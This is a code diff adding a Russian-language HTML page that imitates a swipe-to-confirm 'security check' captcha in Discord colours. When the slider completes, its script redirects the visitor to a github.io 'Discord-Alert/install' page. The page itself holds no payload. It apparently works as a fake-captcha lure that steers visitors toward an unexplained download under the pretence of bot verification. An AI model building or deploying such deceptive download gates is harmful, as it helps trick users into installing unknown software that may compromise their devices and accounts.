@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Подтверждение действия</title>
+    <style>
+        body { margin: 0; font-family: sans-serif; background: #F2F2F2; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .android-box { background: white; width: 320px; padding: 30px; border-radius: 28px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.05); }
+        
+        .icon-shield { width: 60px; margin-bottom: 20px; }
+        h2 { font-size: 20px; margin: 0 0 10px; color: #333; }
+        p { font-size: 14px; color: #777; margin-bottom: 30px; }
+
+        /* Слайдер подтверждения */
+        .slider-container {
+            width: 100%;
+            height: 60px;
+            background: #EEE;
+            border-radius: 30px;
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .slider-text { font-size: 14px; color: #999; user-select: none; }
+        .slider-handle {
+            width: 50px;
+            height: 50px;
+            background: #5865F2;
+            border-radius: 25px;
+            position: absolute;
+            left: 5px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: transform 0.1s;
+        }
+        .slider-handle::after { content: '→'; color: white; font-weight: bold; }
+        .success-msg { color: #43B581; display: none; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div class="android-box">
+    <img src="https://icons8.com" class="icon-shield">
+    <h2>Проверка безопасности</h2>
+    <p>Проведите вправо, чтобы подтвердить, что вы не робот и начать загрузку</p>
+    
+    <div class="slider-container" id="container">
+        <span class="slider-text" id="text">Проведите для загрузки</span>
+        <div class="slider-handle" id="handle"></div>
+    </div>
+    <p id="status" class="success-msg">Подтверждено! Загрузка...</p>
+</div>
+
+<script>
+    const handle = document.getElementById('handle');
+    const container = document.getElementById('container');
+    const status = document.getElementById('status');
+    let isDragging = false;
+
+    handle.addEventListener('mousedown', startDrag);
+    document.addEventListener('mousemove', drag);
+    document.addEventListener('mouseup', endDrag);
+
+    // Для мобилок
+    handle.addEventListener('touchstart', startDrag);
+    document.addEventListener('touchmove', drag);
+    document.addEventListener('touchend', endDrag);
+
+    function startDrag() { isDragging = true; }
+
+    function drag(e) {
+        if (!isDragging) return;
+        let clientX = e.clientX || e.touches[0].clientX;
+        let rect = container.getBoundingClientRect();
+        let pos = clientX - rect.left - 25;
+        
+        if (pos < 5) pos = 5;
+        if (pos > rect.width - 55) {
+            pos = rect.width - 55;
+            onSuccess();
+        }
+        handle.style.left = pos + 'px';
+    }
+
+    function endDrag() {
+        if (!isDragging) return;
+        isDragging = false;
+        if (parseInt(handle.style.left) < 260) {
+            handle.style.transition = '0.3s';
+            handle.style.left = '5px';
+            setTimeout(() => handle.style.transition = '0.1s', 300);
+        }
+    }
+
+function onSuccess() {
+    isDragging = false;
+    container.style.display = 'none';
+    status.style.display = 'block';
+// Вставь это в код каптчи перед тем как делать переход!
+sessionStorage.setItem('captcha_passed', 'true');
+window.location.href = "https://albeepython.github.io/Discord-Alert/install";
+
+    
+    // Плавная задержка перед переходом для эффекта "проверки"
+    setTimeout(() => {
+        window.location.href = "https://albeepython.github.io/Discord-Alert/install/";
+    }, 800);
+}
+
+</script>
+
+</body>
+</html>
